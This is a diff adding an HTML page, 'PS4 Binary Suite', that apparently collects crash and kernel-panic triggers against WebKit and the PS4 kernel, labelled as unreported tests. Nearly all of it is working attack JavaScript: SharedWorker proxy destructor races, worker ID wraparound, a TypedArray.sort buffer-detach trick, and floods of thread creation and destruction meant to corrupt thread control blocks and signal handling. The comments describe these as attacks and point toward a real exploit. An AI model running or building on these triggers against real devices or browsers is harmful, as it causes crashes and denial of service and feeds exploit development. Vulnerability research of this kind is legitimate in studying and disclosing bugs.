@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>PS4 Binary Suite</title>      
+</head>
+<body>
+
+    <div class="section">
+        <h2>TESTES NAO REPORTADOS</h2>   
+       
+        
+      
+
+        <button onclick="runSharedProxyDestruct()">SharedWorkerProxy Destructor Race  KERNEL PANIC</button> 
+        <button onclick="runSharedProxyRace()">SharedWorkerThreadProxy C++ Race KERNEL PANIC</button>
+        <button onclick="runRedZoneBypass()">Stack Red Zone Bypass KERNEL PANIC</button>
+
+        <button onclick="runThreadTCB()">Pthread TCB Corruption (_tcb_set)KERNEL PANIC</button>        
+        <button onclick="runSignalStress()">Worker Signal Stack Corruption KERNEL PANIC</button>
+       
+        
+        <button onclick="runPthreadInternal()">Pthread Internal Memory Error Trigger KERNEL PANIC</button>      
+        <button onclick="runIDWrap()">SharedWorker ID Wraparound KERNEL PANIC </button>
+
+        <button onclick="runSignalRace()">Worker Termination Signal Race(CRASH WEBKIT)</button>
+
+       
+                  
+     
+        
+    </div>
+
+    <div id="log"></div>
+    <div id="dummy"></div>
+    <div id="sandbox"></div>
+
+    <script>
+        function log(msg) { 
+            const el = document.getElementById('log');
+            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
+        }
+
+         // --- 2. TypedArray.sort Buffer Detach ---
+        function runSortDetach() {
+            log("[WebKit] Iniciando Sort Detach...");
+            
+            try {
+                const buffer = new ArrayBuffer(1024 * 1024); // 1MB
+                const array = new Uint8Array(buffer);
+                
+                // Preenche
+                for(let i=0; i<array.length; i++) array[i] = Math.random() * 255;
+                
+                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
+                
+                let detached = false;
+                
+                // O GOLPE: Função de comparação transfere o buffer
+                array.sort((a, b) => {
+                    if (!detached) {
+                        log("Comparador ativo. Transferindo buffer...");
+                        w.postMessage(buffer, [buffer]);
+                        detached = true;
+                    }
+                    return a - b;
+                });
+                
+                log("Sort finalizado (Seguro se não crashou).");
+                w.terminate();
+                
+            } catch(e) {
+                // TypeError é esperado em browsers corrigidos
+                log("Resultado: " + e.message);
+            }
+        }
+
+
+
+        
+
+
+
+
+        // --- 7. SharedWorkerThreadProxy C++ Race ---
+        function runSharedProxyRace() {
+            log("[WebKit] Atacando SharedWorkerThreadProxy...");
+            
+            const workerCode = `
+                onmessage = (e) => {
+                    // Mantém o proxy ocupado serializando
+                    postMessage({data: new Array(10000).fill(1.1)});
+                }
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            let i = 0;
+            const interval = setInterval(() => {
+                const sw = new SharedWorker(url, "race_" + i);
+                sw.port.start();
+                sw.port.postMessage("ping");
+                
+                // O WebKit não tem sw.terminate(), mas podemos garbage collect a referência
+                // ou navegar o iframe que o contém. Aqui simulamos carga rápida.
+                
+                // Força atividade no proxy
+                sw.port.postMessage({buffer: new ArrayBuffer(1024)});
+                
+                i++;
+                if(i % 100 === 0) log(`Workers Proxy Ciclados: ${i}`);
+                if(i > 1000) clearInterval(interval);
+            }, 10);
+        }
+
+
+        // --- 9. SharedWorker ID Wraparound ---
+        function runIDWrap() {
+            log("[WebKit] Iniciando ID Wraparound...");
+            
+            const blob = new Blob([""], {type: "text/javascript"});
+            const url = URL.createObjectURL(blob);
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                // Cria e "esquece" workers rapidamente
+                // O WebKit incrementa um contador estático para cada novo Worker
+                // Se for um uint32, demora, mas se for uint16 ou tabela hash, colide rápido.
+                for(let i=0; i<50; i++) {
+                    new SharedWorker(url, "id_" + count + "_" + i);
+                }
+                
+                count += 50;
+                if(count % 1000 === 0) log(`IDs gerados: ${count}`);
+                
+                // Em um exploit real, tentaríamos reutilizar um ID antigo
+            }, 10);
+        }
+
+        // --- 10. SharedWorkerProxy Destructor Race ---
+        function runSharedProxyDestruct() {
+            log("[WebKit] Iniciando Proxy Destructor Race...");
+            
+            const workerCode = `
+                onmessage = (e) => {
+                    const port = e.ports[0];
+                    // Bombardeia a porta de volta
+                    setInterval(() => port.postMessage(new ArrayBuffer(100)), 0);
+                }
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            let i = 0;
+            const interval = setInterval(() => {
+                const mc = new MessageChannel();
+                const sw = new SharedWorker(url, "race_" + i);
+                sw.port.postMessage("init", [mc.port2]);
+                
+                // Fecha a porta local imediatamente (lado do proxy)
+                // enquanto o worker bombardeia o outro lado
+                setTimeout(() => {
+                    sw.port.close(); // Tenta invalidar o proxy
+                    mc.port1.close();
+                }, Math.random() * 10);
+                
+                i++;
+                if (i % 50 === 0) log(`Proxies destruídos: ${i}`);
+                if (i > 500) clearInterval(interval);
+            }, 20);
+        }
+
+       
+
+        // --- 13. Worker Termination Signal Race ---
+        function runSignalRace() {
+            log("[KERNEL] Iniciando Signal Race...");
+            
+            const workerCode = `
+                onmessage = () => {
+                    // Loop infinito (bloqueia thread)
+                    while(true) {}
+                }
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            const workers = [];
+            
+            // Lança 10 workers bloqueados
+            for(let i=0; i<10; i++) {
+                const w = new Worker(url);
+                w.postMessage("start"); // Bloqueia o worker
+                workers.push(w);
+            }
+            
+            log("Workers bloqueados. Terminando e enviando mensagens...");
+            
+            // Race: Terminar vs Enviar Mensagem
+            // O Kernel está a enviar SIGKILL. Nós tentamos escrever no pipe do socket.
+            workers.forEach(w => {
+                setTimeout(() => {
+                    w.terminate(); // Envia sinal
+                    // Tenta escrever no pipe de uma thread morta/morrendo
+                    try { w.postMessage("race"); } catch(e){}
+                }, 100);
+            });
+            
+            setTimeout(() => log("Race executada."), 2000);
+        }
+
+        // --- 14. Pthread Internal Memory Error Trigger ---
+        function runPthreadInternal() {
+            log("[KERNEL] Triggering Pthread Internal Error...");
+            
+            // Worker que cria e destroi SABs e usa Atomics
+            // O objetivo é corromper a estrutura interna da thread no Kernel
+            const workerCode = `
+                onmessage = (e) => {
+                    const sab = new SharedArrayBuffer(1024);
+                    const view = new Int32Array(sab);
+                    
+                    // Espera fantasma
+                    Atomics.wait(view, 0, 0, 1);
+                    
+                    // Suicídio rápido
+                    close();
+                }
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            let count = 0;
+            // Criação/Destruição de threads em velocidade máxima
+            const interval = setInterval(() => {
+                for(let i=0; i<10; i++) {
+                    const w = new Worker(url);
+                    w.postMessage("die");
+                    // Não terminamos explicitamente, deixamos o 'close()' interno e o GC agirem
+                    // Isso força o Kernel a limpar a thread naturalmente (ou falhar)
+                }
+                count += 10;
+                if (count % 1000 === 0) log(`Threads recicladas: ${count}`);
+                
+                if (count > 20000) {
+                    clearInterval(interval);
+                    log("Pthread stress finalizado.");
+                }
+            }, 10);
+        }
+
+        // --- 16. Stack Red Zone Bypass ---
+        function runRedZoneBypass() {
+            log("[KERNEL] Bypass Red Zone...");
+            
+            const workerCode = `
+                function deep(n) {
+                    const v = new Float64Array(128); // Usa stack
+                    if (n > 0) deep(n-1);
+                }
+                // Assim que nasce, consome stack
+                deep(500); 
+                postMessage("Done");
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
+            
+            // Spawn flood
+            let count = 0;
+            const interval = setInterval(() => {
+                for(let i=0; i<20; i++) {
+                    new Worker(url).onmessage = () => {};
+                }
+                count += 20;
+                if(count > 2000) {
+                    clearInterval(interval);
+                    log("Red Zone Stress finalizado.");
+                }
+            }, 10);
+        }
+
+        
+        // TEST K2: Pthread TCB Corruption
+        // Alvo: "_tcb_set() failed" e "Pthread Internal Memory Error".
+        function runThreadTCB() {
+            log("[KERNEL] Attacking Thread Control Block...", "info");
+            
+            // Worker que usa muito TLS (Thread Local Storage)
+            const blob = new Blob([`
+                onmessage = () => {
+                    const x = new Intl.DateTimeFormat(); // Aloca TLS
+                    close(); // Mata thread
+                }
+            `], {type: 'application/javascript'});
+            const url = URL.createObjectURL(blob);
+            
+            let i = 0;
+            const interval = setInterval(() => {
+                // Cria e mata threads para estressar o alocador de TCB do kernel
+                for(let j=0; j<10; j++) new Worker(url).postMessage("");
+                i += 10;
+                if(i > 1000) { clearInterval(interval); log("TCB Stress finished.", "info"); }
+            }, 10);
+        }
+
+
+// TEST K2: Worker Signal Stack Corruption
+        // Alvo: Gestão de sinais (SigAction) em threads.
+        function runSignalStress() {
+            log("[KERNEL] Estressando Sinais de Thread...", "warn");
+            
+            // Script que gera erros (sinais) propositalmente
+            const blob = new Blob(["throw new Error('Boom')"], {type:'text/javascript'});
+            const url = URL.createObjectURL(blob);
+            
+            // Spamma criação de workers que morrem instantaneamente (SIGTRAP/SIGABRT interno)
+            let count = 0;
+            function spam() {
+                for(let i=0; i<10; i++) new Worker(url);
+                count += 10;
+                if(count < 500) setTimeout(spam, 10);
+                else log("Signal Stress test concluído.", "safe");
+            }
+            spam();
+        }
+ 
+
+    </script>
+</body>
+</html>
